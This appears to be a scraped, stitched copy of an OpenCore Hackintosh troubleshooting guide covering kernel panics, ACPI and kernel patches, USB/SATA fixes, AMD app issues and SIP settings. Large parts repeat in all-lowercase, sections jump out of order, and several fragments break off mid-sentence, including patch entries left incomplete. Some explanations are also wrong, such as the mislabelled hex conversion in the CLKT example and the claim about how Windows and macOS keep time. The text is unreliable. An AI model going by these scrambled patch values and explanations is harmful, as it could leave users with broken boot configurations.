series(ie. Z370, Z490), caused by the RTC clock being disabled by default. See Getting started with ACPI on creating an SSDT-AWAC.aml\n   * X99 and X299 have broken RTC devices, so will need to be fixed with SSDT-RTC0-RANGE. See Getting started with ACPI on creating said file\n   * Some drunk firmware writer at HP also disabled the RTC on the HP 250 G6 with no way to actually re-enable it\n     * Known affected models: HP 15-DA0014dx, HP 250 G6\n     * For users cursed with such hardware you'll need to create a fake RTC clock for macOS to play with. See getting started with ACPI for more details, as well as below image example:\n\nExample of what a disabled RTC with no way to enable looks like(note that there is no value to re-enable it like STAS):\n\n\n\n\n# Stuck at ACPI table loading on B550\n\n\n\nIf you're getting stuck at or near ACPI table loading with an AMD B550 or A520 motherboard, add the following SSDT:\n\n * SSDT-CPUR.aml\n\nAnd please remember to add this SSDT to both EFI/OC/ACPI and your config.plist under ACPI -> Add(ProperTree's snapshot function can do this for you)\n\n\n# \"Waiting for Root Device\" or Prohibited Sign error\n\n * Other names: Stop Sign, Scrambled\n\nThis is generally seen as a USB or SATA error, couple ways to fix:\n\n\n# USB Issues\n\nThis assumes you're only booting the installer USB and not macOS itself.\n\n * If you're hitting the 15 port limit, you need to make an USB Map\n\n * Another issue can be that certain firmware won't pass USB ownership to macOS\n   \n   * UEFI -> Quirks -> ReleaseUsbOwnership -> True\n   * Enabling EHCI/XHCI Handoff in the BIOS can fix this as well\n\n * Sometimes, if the USB is plugged into a 3.x port, plugging it into a 2.0 port can fix this error and vice versa.\n\n * For AMD's 15h and 16h CPUs, you may need to add the following:\n   \n   * XLNCUSBFix.kext\n\n * If XLNCUSBFix still doesn't work, then try the following alongside XLNCUSBFix:\n   \n   * AMD StopSign-fixv5\n\n * X299 Users: Enable Above4G Decoding\n   \n   * Odd firmware bug on X299 where USB breaks otherwise\n\n * Missing USB ports in ACPI:\n   \n   * For Intel's Coffee Lake and older, we recommend using USBInjectAll\n   * For Intel's Ice Lake and Comet Lake, we recommend SSDT-RHUB\n     * SSDTTime's 7. USB Reset option can do the same\n   * For AMD, run SSDTTime's 7. USB Reset option and add the provided SSDT-RHUB to your EFI and config.plist\n\n\n# SATA Issues\n\nOn rare occasions(mainly laptops), the SATA controller isn't officially supported by macOS. To resolve this, we'll want to do a few things:\n\n * Set SATA to AHCI mode in the BIOS\n   * macOS doesn't support hardware RAID or IDE mode properly.\n   * Note drives already using Intel Rapid Storage Technology(RST, soft RAID for Windows and Linux) will not be accessible in macOS.\n * SATA-unsupported.kext\n   * Adds support to obscure SATA controllers, commonly being laptops.\n   * For very legacy SATA controllers, AHCIPortInjector.kext may be more suitable.\n * Catalina's patched AppleAHCIPort.kext\n   * For users running macOS 11, Big Sur and having issues. This backports the known working Catalina kext, SATA-unsupported is not needed with this kext\n\nNote that you will only experience this issue after installing macOS onto the drive, booting the macOS installer will not error out due to SATA issues.\n\n\n# Kernel panic with IOPCIFamily on X99\n\nFor those running the X99 platform from Intel, please go over the following:\n\n * The following kernel patches are enabled:\n   * AppleCpuPmCfgLock\n   * AppleXcpmCfgLock\n   * AppleXcpmExtraMsrs\n * You have the following SSDTs:\n   * SSDT-UNC(if not, see Getting started with ACPI on creating said file)\n\n\n# Stuck on or near IOConsoleUsers: gIOScreenLock.../gIOLockState (3...\n\nThis is right before the GPU is properly initialized, verify the following:\n\n * GPU is UEFI capable(GTX 7XX/2013+)\n * CSM is off in the BIOS\n   * May need to be enabled on laptops\n * Forcing PCIe 3.0 link speed\n * Double check that ig-platform-id and device-id are valid if running an iGPU.\n   * Desktop UHD 630's may need to use 00009B3E instead\n * Trying various WhateverGreen Fixes\n   * -igfxmlr boot argument. This can also manifest as a \"Divide by Zero\" error.\n * Coffee Lake iGPU users may also need igfxonln=1 in 10.15.4 and newer\n\n\n# Scrambled Screen on laptops\n\nEnable CSM in your UEFI settings. This may appear as \"Boot legacy ROMs\" or other legacy setting.\n\n\n# Black screen after IOConsoleUsers: gIOScreenLock... on Navi\n\n * Add agdpmod=pikera to boot args\n * Switch between different display outputs\n * Try running MacPro7,1 SMBIOS with the boot-arg agdpmod=ignore\n\nFor MSI Navi users, you'll need to apply the patch mentioned here: Installer not working with 5700XT #901\n\nSpecifically, add the following entry under Kernel -> Patch:\n\nMSI Navi Patch\n\nBase:\nComment: Navi VBIOS Bug Patch\nCount: 1\nEnabled: YES\nFind: 4154592C526F6D2300\nIdentifier: com.apple.kext.AMDRadeonX6000Framebuffer\nLimit: 0\nMask:\nMinKernel: 19.00.00\nMaxKernel: 19.99.99\nReplace: 414D442C526F6D2300\nReplaceMask:\nSkip: 0\n\n\nNote: macOS 11, Big Sur no longer requires this patch for MSI Navi.\n\n\n# Kernel Panic Cannot perform kext summary\n\nGenerally seen as an issue surrounding the prelinked kernel, specifically that macOS is having a hard time interpreting the ones we injected. Verify that:\n\n * Your kexts are in the correct order(master then plugins, Lilu always before the plugins)\n * Kexts with executables have them and plist only kexts don't(ie. USBmap.kext, XHCI-unspported.kext, etc does not contain an executable)\n * Don't include multiple of the same kexts in your config.plist(ie. including multiple copies of VoodooInput from multiple kexts, we recommend choosing the first kext in your config's array and disable the rest)\n\nNote: this error may also look very similar to Kernel Panic on Invalid frame pointer\n\n\n# Kernel Panic AppleIntelMCEReporter\n\nWith macOS Catalina, dual socket support is broken, and a fun fact about AMD firmware is that some boards will actually report multiple socketed CPUs. To fix this, add AppleMCEReporterDisabler to both EFI/OC/Kexts and config.plist -> Kernel -> Add\n\n\n# Kernel Panic AppleIntelCPUPowerManagement\n\nThis is likely due to faulty or outright missing NullCPUPowerManagement. To fix the issue, remove NullCPUPowerManagement from Kernel -> Add and EFI/OC/Kexts then enable DummyPowerManagement under Kernel -> Emulate\n\n * Note: On older Intel CPUs(ie. Penryn and older), it may be due to IRQ conflicts or the HPET device being disabled. To resolve, you have 2 options:\n   * SSDTTime's FixHPET Option\n   * Forcing the HPET Device on\n\nForcing the HPET Device on\n\nUnder ACPI -> Patch:\n\nCOMMENT   STRING    FORCE HPET ONLINE\nEnabled   Boolean   YES\nCount     Number    0\nLimit     Number    0\nFind      Data      A010934F53464C00\nReplace   Data      A40A0FA3A3A3A3A3\n\n\n# Kernel Panic AppleACPIPlatform in 10.13\n\n\n\nOn macOS 10.13, High Sierra the OS is much stricter with ACPI tables, specifically a bug with how headers were handled. To resolve, enable NormalizeHeaders under ACPI -> Quirks in your config.plist\n\n\n# macOS frozen right before login\n\nThis is a common example of screwed up TSC, for most system add CpuTscSync\n\nThe most common way to see the TSC issue:\n\nCASE 1   CASE 2\n         \n\n\n# Keyboard works but trackpad does not\n\nMake sure that VoodooInput is listed before VoodooPS2 and VoodooI2C kexts in your config.plist.\n\nVoodooI2C Troubleshooting\n\nCheck the order that your kexts load - make they match what is shown under Gathering Files:\n\n 1. VoodooGPIO, VoodooInput, and VoodooI2CServices in any order (Found under VoodooI2C.kext/Contents/PlugIns)\n 2. VoodooI2C\n 3. Satellite/Plugin Kext\n\nMake sure you have SSDT-GPIO in EFI/OC/ACPI and in your config.plist under ACPI -> Add in your config.plist. If you are still having issues, reference the Getting Started With ACPI GPIO page.\n\n\n# kextd stall[0]: AppleACPICPU\n\nThis is due to either a missing SMC emulator or broken one, make sure of the following:\n\n * Lilu and VirtualSMC are both in EFI/OC/kexts and in your config.plist\n * Lilu is before VirtualSMC in the kext list\n * Last resort is to try FakeSMC instead, do not have both VirtualSMC and FakeSMC enabled\n\n\n# Kernel Panic on AppleIntelI210Ethernet\n\nFor those running Comet lake motherboards with the I225-V NIC, you may experience a kernel panic on boot due to the I210 kext. To resolve this, make sure you have the correct PciRoot for your Ethernet. This commonly being either:\n\n * PciRoot(0x0)/Pci(0x1C,0x1)/Pci(0x0, 0x0)\n   * By default, this is what Asus and Gigabyte motherboards use\n * PciRoot(0x0)/Pci(0x1C,0x4)/Pci(0x0,0x0)\n   * Some OEMs may use this instead\n\nFor those who can to your PciRoot manually, you'll want to install macOS fully and run the following with gfxutil:\n\n/path/to/gfxutil | grep -i \"8086:15f3\"\n\n\nThis should spit out something like this:\n\n00:1f.6 8086:15f3 /PC00@0/GBE1@1F,6 = PciRoot(0x0)/Pci(0x1F,0x6)\n\n\nThe ending PciRoot(0x0)/Pci(0x1F,0x6) is what you want to add in your config.plist with device-id of F2150000\n\n\n# Kernel panic on \"Wrong CD Clock Frequency\" with Icelake laptop\n\n\n\nTo resolve this kernel panic, ensure you have -igfxcdc in your boot-args.\n\n\n# Kernel panic on \"cckprng_int_gen\"\n\nFull panic:\n\n\"cckprng_int_gen: generator has already been sealed\"\n\n\nThis is likely to be 1 of 2 things:\n\n * Missing SMC Emulator(ie. no VirtualSMC in your config.plist or EFI)\n   * Add VirtualSMC.kext to your config.plist and EFI\n * Incorrect SSDT usage with SSDT-CPUR\n\nFor the latter, ensure you're only using SSDT-CPUR with B550 and A520. Do not use on X570 or older hardware(ie. B450 or A320)\n\n\n# Stuck at Forcing CS_RUNTIME for entitlement in Big Sur\n\n\n\nThis is actually the part at where macOS will seal the system volume, and where it may seem that macOS has gotten stuck. DO NOT RESTART thinking you're stuck, this will take quite some time to complete.\n\n\n# Stuck on ramrod(^^^^^^^^^^^^^)\n\n\n\nIf you get stuck around the ramrod section (specifically, it boots, hits this error, and reboots again back into this, causing a loop), this hints that your SMC emulator is broken. To fix this, you have 2 options:\n\n * Ensure you're using the latest builds of VirtualSMC and Lilu, with the vsmcgen=1 boot-arg\n * Switch over to Rehabman's FakeSMC (you can use the MinKernel/MaxKernel trick mentioned above to restrict FakeSMC to Big Sur and up\n\nAnd when switching kexts, ensure you don't have both FakeSMC and VirtualSMC enabled in your config.plist, as this will cause a conflict.\n\n\n# Virtual Machine Issues\n\n * VMWare 15 is known to get stuck on [EB|#LOG:EXITBS:START].

breaks with some firmwares\n\n * setupvirtualmap\n   \n   * this quirk is required for the majority of firmwares and without it it's very common to kernel panic here, so enable it if not already\n     * mainly z390 and older require this quirk enabled\n     * however, certain firmwares(mainly 2020+) do not work with this quirk and so may actually cause this kernel panic:\n       * intel's ice lake series\n       * intel's comet lake series(b460, h470, z490, etc)\n       * amd's b550 and a520(latest bios on x570 are also included now)\n         * many b450 and x470 boards with late 2020 bios updates are also included\n       * amd's trx40\n       * vms like qemu\n       * x299 2020+ bios updates(this applies to other x299 boards on the latest bios that released either in late 2019 or 2020+)\n\n * enablewriteunprotector\n   \n   * another issue may be that macos is conflicting with the write protection from cr0 register, to resolve this we have 2 options:\n     * if your firmware supports mats(2018+ firmwares):\n       * enablewriteunprotector -> false\n       * rebuildapplememorymap -> true\n       * syncruntimepermissions -> true\n     * for older firmwares:\n       * enablewriteunprotector -> true\n       * rebuildapplememorymap -> false\n       * syncruntimepermissions -> false\n     * note: some laptops(ex. dell inspiron 5370) even with mats support will halt on boot up, in these cases you'll have two options:\n       * boot with the old firmware quirk combo(ie. with enablewriteunprotector and disable rebuildapplememorymap + syncruntimepermissions)\n       * enable devirtualisemmio and follow mmiowhitelist guide\n\nregarding mats support, firmwares built against edk 2018 will support this and many oems have even added support all the way back to skylake laptops. issue is it's not always obvious if an oem has updated the firmware, you can check the opencore logs whether yours supports it(see here how to get a log):\n\nocabc: mat support is 1\n\n\n * note: 1 means it supports mats, while 0 means it does not.\n\n\n# kernel patch issues\n\nthis section will be split between intel and amd users:\n\n# amd users\n\n * missing kernel patches(only applies for amd cpus, make sure they're opencore patches and not clover. clover uses matchos while opencore has minkernel and maxkernel)\n   * note outdated kernel patches will also have the same effect please ensure you're using the latest patches from amd os x\n\n# intel users\n\n * applexcpmcfglock and applecpupmcfglock\n   * missing cfg or xcpm patches, please enable applexcpmcfglock and applecpupmcfglock\n     * haswell and newer only need applexcpmcfglock\n     * ivy bridge and older only need applecpupmcfglock\n       * broadwell and older need applecpupmcfglock if running 10.10 or older\n   * alternatively you can properly disable cfg-lock: fixing cfg lock\n * applexcpmextramsrs\n   * may also be required, this is generally meant for pentiums, hedt and other odd systems not natively supported in macos.\n\n# legacy intel users\n\nfor macos big sur, many firmwares have issues determining the cpu core count and thus will kernel panic too early for screen printing. via serial, you can see the following panic:\n\nmax_cpus_from_firmware not yet initialized\n\n\nto resolve:\n\n * enable avoidruntimedefrag under booter -> quirks\n   * this should work for most firmwares\n\nhowever on certain machines like the hp compaq dc 7900, the firmware will still panic so we need to force a cpu core count value. only use the below patch if avoidruntimedefrag didn't work:\n\nlegacy cpu core patch\n\nto do this, add the following patch(replacing the 04 from b8 04 00 00 00 c3 with the amount of cpu threads your hardware supports):\n\nkey           type      value\nbase          string    _acpi_count_enabled_logical_processors\ncount         integer   1\nenabled       boolean   true\nfind          data      \nidentifier    string    kernel\nlimit

details: stuck on [eb|#log:exitbs:start]\n\n * note: enabling debug opencore can help shed some light as well\n\n\n# getting the error x64 exception type... on amd fx systems\n\nthis error can have multiple causes:\n\n * compatibility support module (csm) being enabled in your bios:\n   \n   might also be called legacy boot support, load legacy option roms/oproms\n\n * the providecurrentcpuinfo quirk (required by the unified patches) being incompatible with your firmware:\n   \n   this means you need to use an older version of the patches and big sur or older. after downloading the older patches linked above, merge them into your config.plist (making sure to remove the old patches first).\n\nan example:\n\n\n\n\n# kernel panic on invalid frame pointer\n\nso this is due to some issue around the booter -> quirks you set, main things to check for:\n\n * devirtualisemmio\n   \n   * certain mmio spaces are still required to function correctly, so you'll need to either exclude these regions in booter -> mmiowhitelist or disable this quirk outright\n   * more info here: using devirtualisemmio\n\n * setupvirtualmap\n   \n   * this quirk is required for the majority of firmwares and

lot of pci devices are first setup and configured, and is where most booting issues will happen. other names include:\n\n * apfs_module_start...,\n * waiting for root device,\n * waiting on...ioresources...,\n * previous shutdown cause...\n\nthe main places to check:\n\n * missing ec patch:\n   \n   * make sure you have your ec ssdt both in efi/oc/acpi and acpi -> add, double check it's enabled.\n   * if you don't have one, grab it here: getting started with acpi\n\n * irq conflict:\n   \n   * most common on older laptops and pre-builts, run ssdttime's fixhpet option and add the resulting ssdt-hpet.aml and acpi patches to your config( the ssdt will not work without the acpi patches)\n\n * pci allocation issue:\n   \n   * update your bios, make sure it's on the latest. most oems have very broken pci allocation on older firmwares, especially amd\n   * make sure either above4g is enabled in the bios, if no option available then add npci=0x2000 or npci=0x3000 (try both one at a time) to boot args.\n     * some x99 and x299 boards(ie. ga-x299-ud4) may require both npci boot-arg and above4g enabled\n     * amd cpu note: do not have both the above4g setting enabled and npci in boot args, they will conflict\n     * 2020+ bios notes: when enabling above4g, resizable bar support may become an available. please ensure that booter -> quirks -> resizeapplegpubars is set to 0 if this is enabled.\n   * other bios settings that are important: csm disabled, windows 8.1/10 uefi mode enabled\n\n * nvme or sata issue:\n   \n   * sometimes if either a bad sata controller or an unsupported nvme drive are used, you can commonly get stuck here. things you can check:\n     * not using either a samsung pm981 or micron 2200s nvme ssd\n     * samsung 970 evo plus running the latest firmware(older firmwares were known for instability and stalls, see here for more info)\n     * sata hot-plug is disabled in the bios(more commonly to cause issues on amd cpu based systems)\n     * ensure nvme drives are set as nvme mode in bios(some bios have a bug where you can set nvme drives as sata)\n\n * nvram failing:\n   \n   * common issue hedt and 300 series motherboards, you have a couple paths to go down:\n     * 300 series consumer intel: see getting started with acpi on making ssdt-pmc.aml\n     * hedt(ie. x99): see emulating nvram on how to stop nvram write, note that for install you do not need to run the script. just setup the config.plist\n\n * rtc missing:\n   \n   * commonly found on intel's 300+ series(ie. z370, z490), caused by the rtc clock being disabled by default. see getting started with acpi on creating an ssdt-awac.aml\n   * x99 and x299 have broken rtc devices, so will need to be fixed with ssdt-rtc0-range. see getting started with acpi on creating said file\n   * some drunk firmware writer at hp also disabled the rtc on the hp 250 g6 with no way to actually re-enable it\n     * known affected models: hp 15-da0014dx, hp 250 g6\n     * for users cursed with such hardware you'll need to create a fake rtc clock for macos to play with. see getting started with acpi for more details, as well as below image example:\n\nexample of what a disabled rtc with no way to enable looks like(note that there is no value to re-enable it like stas):\n\n\n\n\n# stuck at acpi table loading on b550\n\n\n\nif you're getting stuck at or near acpi table loading with an amd b550 or a520 motherboard, add the following ssdt:\n\n * ssdt-cpur.aml\n\nand please remember to add this ssdt to both efi/oc/acpi and your config.plist under acpi -> add(propertree's snapshot function can do this for you)\n\n\n# \"waiting for root device\" or prohibited sign error\n\n * other names: stop sign, scrambled\n\nthis is generally seen as a usb or sata error, couple ways to fix:\n\n\n# usb issues\n\nthis assumes you're only booting the installer usb and not macos itself.\n\n * if you're hitting the 15 port limit, you need to make an usb map\n\n * another issue can be that certain firmware won't pass usb ownership to macos\n   \n   * uefi -> quirks -> releaseusbownership -> true\n   * enabling ehci/xhci handoff in the bios can fix this as well\n\n * sometimes, if the usb is plugged into a 3.x port, plugging it into a 2.0 port can fix this error and vice versa.\n\n * for amd's 15h and 16h cpus, you may need to add the following:\n   \n   * xlncusbfix.kext\n\n * if xlncusbfix still doesn't work, then try the following alongside xlncusbfix:\n   \n   * amd stopsign-fixv5\n\n * x299 users: enable above4g decoding\n   \n   * odd firmware bug on x299 where usb breaks otherwise\n\n * missing usb ports in acpi:\n   \n   * for intel's coffee lake and older, we recommend using usbinjectall\n   * for intel's ice lake and comet lake, we recommend ssdt-rhub\n     * ssdttime's 7. usb reset option can do the same\n   * for amd, run ssdttime's 7. usb reset option and add the provided ssdt-rhub to your efi and config.plist\n\n\n# sata issues\n\non rare occasions(mainly laptops), the sata controller isn't officially supported by macos. to resolve this, we'll want to do a few things:\n\n * set sata to ahci mode in the bios\n   * macos doesn't support hardware raid or ide mode properly.\n   * note drives already using intel rapid storage technology(rst, soft raid for windows and linux) will not be accessible in macos.\n * sata-unsupported.kext\n   * adds support to obscure sata controllers, commonly being laptops.\n   * for very legacy sata controllers, ahciportinjector.kext may be more suitable.\n * catalina's patched appleahciport.kext\n   * for users running macos 11, big sur and having issues. this backports the known working catalina kext, sata-unsupported is not needed with this kext\n\nnote that you will only experience this issue after installing macos onto the drive, booting the macos installer will not error out due to sata issues.\n\n\n# kernel panic with iopcifamily on x99\n\nfor those running the x99 platform from intel, please go over the following:\n\n * the following kernel patches are enabled:\n   * applecpupmcfglock\n   * applexcpmcfglock\n   * applexcpmextramsrs\n * you have the following ssdts:\n   *

* try running macpro7,1 smbios with the boot-arg agdpmod=ignore\n\nfor msi navi users, you'll need to apply the patch mentioned here: installer not working with 5700xt #901\n\nspecifically, add the following entry under kernel -> patch:\n\nmsi navi patch\n\nbase:\ncomment: navi vbios bug patch\ncount: 1\nenabled: yes\nfind: 4154592c526f6d2300\nidentifier:

ones we injected. verify that:\n\n * your kexts are in the correct order(master then plugins, lilu always before the plugins)\n * kexts with executables have them and plist only kexts don't(ie. usbmap.kext, xhci-unspported.kext, etc does not contain an executable)\n * don't include multiple of the same kexts in your config.plist(ie. including multiple copies of voodooinput from multiple kexts, we recommend choosing the first kext in your config's array and disable the rest)\n\nnote: this error may also look very similar to kernel panic on invalid frame pointer\n\n\n# kernel panic appleintelmcereporter\n\nwith macos catalina, dual socket support is broken, and a fun fact about amd firmware is that some boards will actually report multiple socketed cpus. to fix this, add applemcereporterdisabler to both efi/oc/kexts and config.plist -> kernel -> add\n\n\n# kernel panic appleintelcpupowermanagement\n\nthis is likely due to faulty or outright missing nullcpupowermanagement. to fix the issue, remove nullcpupowermanagement from kernel -> add and efi/oc/kexts then enable dummypowermanagement under kernel -> emulate\n\n * note: on older intel cpus(ie. penryn and older), it may be due to irq conflicts or the hpet device being disabled. to resolve, you have 2 options:\n   * ssdttime's fixhpet option\n   * forcing the hpet device on\n\nforcing the

acpi -> add in your config.plist. if you are still having issues, reference the getting started with acpi gpio page.\n\n\n# kextd stall[0]: appleacpicpu\n\nthis is due to either a missing smc emulator or broken one, make sure of the following:\n\n * lilu and virtualsmc are both in efi/oc/kexts and in your config.plist\n * lilu is before virtualsmc in the kext list\n * last resort is to try fakesmc instead, do not have both virtualsmc and fakesmc enabled\n\n\n# kernel panic on appleinteli210ethernet\n\nfor those running comet lake motherboards with the i225-v nic, you may experience a kernel panic on boot due to the i210 kext. to resolve this, make sure you have the correct pciroot for your ethernet. this commonly being either:\n\n * pciroot(0x0)/pci(0x1c,0x1)/pci(0x0, 0x0)\n   * by default, this is what asus and gigabyte motherboards use\n * pciroot(0x0)/pci(0x1c,0x4)/pci(0x0,0x0)\n   * some oems may use this instead\n\nfor those who can to your pciroot manually, you'll want to install macos fully and run the following with gfxutil:\n\n/path/to/gfxutil | grep -i \"8086:15f3\"\n\n\nthis should spit out something like this:\n\n00:1f.6 8086:15f3 /pc00@0/gbe1@1f,6 = pciroot(0x0)/pci(0x1f,0x6)\n\n\nthe ending pciroot(0x0)/pci(0x1f,0x6) is what you want to add in your config.plist with device-id of f2150000\n\n\n# kernel panic on \"wrong cd clock frequency\" with

ssdt usage with ssdt-cpur\n\nfor the latter, ensure you're only using ssdt-cpur with b550 and a520. do not use on x570 or older hardware(ie. b450 or a320)\n\n\n# stuck at forcing cs_runtime for entitlement in big sur\n\n\n\nthis is actually the part at where macos will seal the system volume, and where it may seem that macos has gotten stuck. do not restart thinking you're stuck, this will take quite some time to complete.\n\n\n# stuck on ramrod(^^^^^^^^^^^^^)\n\n\n\nif you get stuck around the ramrod section (specifically, it boots, hits this error, and reboots again back into this, causing a loop), this hints that your smc emulator is broken. to fix this, you have 2 options:\n\n * ensure you're using the latest builds of virtualsmc and lilu, with the vsmcgen=1 boot-arg\n * switch over to rehabman's fakesmc (you can use the minkernel/maxkernel trick mentioned above to restrict fakesmc to big sur and up\n\nand when switching kexts, ensure you don't have both fakesmc and virtualsmc enabled in your config.plist, as this will cause a conflict.\n\n\n# virtual machine issues\n\n * vmware 15 is known to get stuck on [eb|#log:exitbs:start]. vmware 16 resolves the problem.\n\n\n# reboot on \"appleusbhostport::createdevice: failed to create device\" on macos 11.3+\n\nthis is due to xhciportlimit breaking with macos 11.3 and newer, to resolve this, you must

First, you have to open Device Manager, and head to the following:\n\nDevice Manager -> Mice and other pointing devices -> Double click on your trackpad -> Properties -> Details > BIOS device name\n\n\nThen grab SSDT-Enable_DynamicEWMode.dsl By default, this uses PCI0.LPCB.PS2K for the pathing. you'll want to rename accordingly.\n\nExternal (_SB_.PCI0.LPCB.PS2K, DeviceObj) <- Rename this\n\n    Name(_SB.PCI0.LPCB.PS2K.RMCF, Package()  <- Rename this\n\n\n\nThen compile with MaciASL, copy to your OC/ACPI folder, and add it to your config, and you should be good to go.\n\n * Note: Although this will work for most cases, the trackpad may be laggy and you may not be able to use the physical buttons (more details). If you can live without the trackpad, this may be better:\n\nFind the ACPI path of your mouse (see above), then grab SSDT-DisableTrackpadProbe.dsl. By default, this uses PCI0.LPCB.PS2K so you have to change that to your ACPI path if necessary:\n\nExternal (_SB_.PCI0.LPCB.PS2K, DeviceObj) <- Rename this\n\n    Name(_SB.PCI0.LPCB.PS2K.RMCF, Package() <- Rename this\n\n\n\n# Fix for Dell breakless PS2 keyboard keys\n\nFor those with issues surrounding key presses not releasing(ie. pressing infinitely), you'll want to enable VoodooPS2's Dell profile.\n\nFirst of all, you need to find the path to your ACPI keyboard object in the Device Manager:\n\nDevice Manager -> Keyboards -> Double click on your keyboard -> Properties -> Details > BIOS device name\n\n\nAfter this, grab SSDT-KEY-DELL-WN09.dsl and change the ACPI path to the one found above as needed:\n\nExternal (_SB_.PCI0.LPCB.PS2K, DeviceObj) <- Rename this\n\n    Method(_SB.PCI0.LPCB.PS2K._DSM, 4) <- Rename this\n\n\n\n# macOS GPU acceleration missing on AMD X570\n\nVerify the following:\n\n * GPU is UEFI capable(GTX 7XX/2013+)\n * CSM is off in the BIOS\n * Forcing PCIe 3.0 link speed\n\n\n# DRM Broken\n\nRefer to Fixing DRM section\n\n\n# \"Memory Modules Misconfigured\" on MacPro7,1\n\nFollow guide listed here:\n\n * Fixing MacPro7,1 Memory Errors\n\nFor those who simply want to disable the notification(not the error itself) is more than enough. For these users, we recommend installing RestrictEvents\n\n\n# Apps crashing on AMD\n\nEasy fix, buy Intel\n\nSo with AMD, whenever Apple calls CPU specific functions the app will either not work or outright crash. Here are some apps and their \"fixes\":\n\n * Adobe Products don't always work\n   * Some fixes can be found here: Adobe Fixes\n   * Do note these fixes just disables functionality, they're not really fixes\n * Virtual Machine running off of AppleHV's framework will not work(ie: Parallels 15, VMware)\n   * VirtualBox works fine as it doesn't use AppleHV\n   * VMware 10 and older can work as well\n   * Parallels 13.1.0 and older are known to work as well\n * Docker broken\n   * Docker toolbox is the only solution as it's based off of VirtualBox, many features are unavailable with this version\n * IDA Pro won't install\n   * There's an Intel specific check in the installer, app itself is likely fine\n * 15/16h CPU web pages crashing\n   * Follow directions here after UPDATE 5: Fix web pages\n\n\n# Sleep crashing on AMD\n\nThis is generally seen on AMD who use the chipset's USB controller, specifically for the Ryzen series and newer. The main way to tell if you're having issues with this is checking logs after either sleeping or waking:\n\n * In terminal:\n   * log show --last 1d | grep -i \"Wake reason\"\n\nShould result in something like this:\n\nSleep transition timed out after 180 seconds while calling power state change callbacks. Suspected bundle: com.apple.iokit.IOUSBHostFamily.\n\n\nYou can double check which controller is XHC0 via IOReg and checking the Vendor ID(1022 for AMD chipset). The fix for this sleep issue is either:\n\n * Avoid the chipset USB all together(ideally set _STA = 0x0 to disable the controller outright with an SSDT)\n * Correct the USBX power properties to what the controller expects\n\n\n# AssetCache Content Caching unavailable in virtual machine\n\nErrors such as:\n\n$ sudo AssetCacheManagerUtil activate\nAssetCacheManagerUtil[] Failed to activate content caching: Error Domain=ACSMErrorDomain Code=5 \"virtual machine\"...\n\n\narise due to VMM flag being exposed by sysctl.\n\nApply VmAssetCacheEnable kernel patch to disguise the flag and allow normal operation.\n\n\n# Coffee Lake systems failing to wake\n\nIn macOS 10.15.4, there were some changes made to AGPM that can cause wake issues on Coffee Lake systems. Specifically displays hooked up to the iGPU would fail to wake. To resolve this:\n\n * Add igfxonln=1 to boot-args\n * Make sure you're using WhateverGreen v1.3.8 or newer\n\n\n# No brightness control on Dual GPU laptops\n\nIn macOS 11.3, there were some changes made to backlight controlling mechanisms that defaults the backlight to be controlled by the dGPU on Dual GPU laptops with MUX enabled. Optimus only laptops, however, are not affected, since you need to disable the dGPU anyways. Specifically, this problem only causes issues if you have a Dual GPU laptop with the internal screen from an iGPU output and external screens from dGPU outputs (Hybrid Mode on some Mobile Workstations). To resolve this, you may disable either the iGPU or the dGPU, or do the following:\n\n * Verify SSDT-PNLF is installed(ie. EFI/OC/ACPI as well as config.plist -> ACPI -> Add)\n\n * Add below to PciRoot(0x0)/Pci(0x2,0x0):\n\n@0,backlight-control | Data | 01000000\n\napplbkl | Data | 01000000\n\nAAPL,backlight-control | Data | 01000000\n\nAAPL00,backlight-control | Data | 01000000\n\n * Add below to your dGPU PCI address:\n\n@0,backlight-control | Data | 00000000\n\napplbkl | Data | 00000000\n\nAAPL,backlight-control | Data | 00000000\n\n\n# No temperature/fan sensor output\n\nSo couple things:\n\n * iStat Menus doesn't yet support MacPro7,1 readouts\n * VirtualSMC's bundled sensors do not support AMD\n\nFor iStat, you'll have to wait for an update. For AMD users, you can use either:\n\n * SMCAMDProcessor\n   * Still in early beta but great work has been done, note it's been mainly tested on Ryzen\n * FakeSMC3_with_plugins\n\nNote for AMD with FakeSMC:\n\n * FileVault support requires more work with FakeSMC\n * Make sure no other SMC kexts are present, specifically those from VirtualSMC\n\n\n# \"You can't change the startup disk to the selected disk\" error\n\nThis is commonly caused by irregular partition setup of the Windows drive, specifically that the EFI is not the first partition. To fix this, we need to enable this quirk:\n\n * PlatformInfo -> Generic -> AdviseFeatures -> True\n\n\n\n\n# Selecting Startup Disk doesn't apply correctly\n\nIf you're having issues with Startup Disk correctly applying your new boot entry, this is most likely caused by a missing DevicePathsSupported in your I/O Registry. To resolve this, ensure you are using PlatformInfo -> Automatic -> True\n\nExample of missing DevicePathsSupported:\n\n * Default DevicePath match failure due to different PciRoot #664\n\n\n# macOS waking up with the wrong time\n\nAn odd quirk some people may notice is that from wake, macOS will have the incorrect time for a bit before self-correcting with network time check. The root cause of this issue is most likely due to your RTC not ticking, and can be resolved with a new CMOS battery(note that Z270 and newer are quite picky with voltage so choose carefully).\n\nTo verify whether your RTC is working correctly:\n\n * Download VirtualSMC v1.1.5+ and run the smcread tool:\n\n/path/to/smcread -s | grep CLKT\n\n\n\n\nThis should provide you with a hexadecimal value, and once converted it should equal time elapsed from Midnight relative to Cupertino.\n\nSo for this example, we'll grab our value(00010D13) then convert it to decimal and finally divide it by 3600. This should result in the approximate time elapsed(in seconds) since midnight relative to Cupertino\n\n * 00010D13 (Convert to HEX)-> 68883 (Divided by 3600 so we get hours)-> 19.13h(so 19:07:48)\n\nNext you'll want to put your hack to sleep for a bit and wake it, then check the CLKT value once more to see whether it deviated more or if it has a set difference. If you find it didn't actually tick much of at all from the elapsed time, you'll need to look into buying a new battery(with proper voltage)\n\n\n# No Volume/Brightness control on external monitors\n\nOddly enough, macOS has locked down digital audio from having control. To bring back some functionality, the app MonitorControl has done great work on improving support in macOS\n\n\n# Time inconsistency between macOS and Windows\n\nThis is due to macOS using Universal Time while Windows relies on Greenwich time, so you'll need to force one OS to a different way of measuring time. We highly recommend modifying Windows instead as it's far less destructive and painful:\n\n * Install Bootcamp utilities\n * Modify Windows' registry\n\n\n# Disabling SIP\n\nSIP or more properly known as System Integrity Protection, is a security technology that attempts to prevent any malicious software and the end user from damaging the OS. First introduced with OS X El Capitan, SIP has grown over time to control more and more things in macOS, including limiting edits to restricted file locations and 3rd party kext loading with kextload(OpenCore is unaffected as kexts are injected at boot). To resolve this, Apple has provided numerous configuration options in the NVRAM variable csr-active-config which can either be set in the macOS recovery environment or with OpenCore's NVRAM section(The latter will be discussed below).\n\n * WARNING: Disabling SIP can break OS functionality such as software updates in macOS 11, Big Sur and newer. Please be careful to only disable specific SIP values instead of disabling 